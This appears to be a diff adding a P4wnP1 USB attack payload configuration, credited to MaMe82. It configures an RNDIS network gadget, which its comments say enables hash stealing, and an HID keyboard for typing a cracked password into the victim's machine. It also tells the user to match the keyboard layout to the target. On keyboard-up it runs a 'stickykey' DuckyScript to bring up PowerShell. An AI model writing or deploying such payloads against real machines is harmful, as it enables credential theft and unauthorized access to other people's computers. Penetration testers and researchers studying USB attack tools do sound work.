@@ -1,0 +1,26 @@
+# P4wnP1 demo payload by MaMe82
+# ==========================
+#
+
+# =============================
+# USB setup
+# =============================
+USB_VID="0x1d6b"    # Vendor ID
+USB_PID="0x1004"    # Product ID
+USE_ECM=false       # we need no Linux/Mac networking
+USE_RNDIS=true      # RNDIS network device to enable hash stealing
+USE_HID=true        # HID keyboard to allow entering cracked password
+USE_UMS=false # enable USB Mass Storage
+
+# Keyboard language for outhid and duckhid commands
+# possible languages: "be", "br", "ca", "ch", "de", "dk", "es", "fi",
+# 	"fr", "gb", "hr", "it", "no", "pt", "ru", "si", "sv", "tr", "us"
+lang="de" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+
+function onKeyboardUp()
+{
+	# execute DuckyScript responsible for bringing up PowerShell
+	cat $wdir/DuckyScripts/stickykey.duck | duckhid
+}
+
+
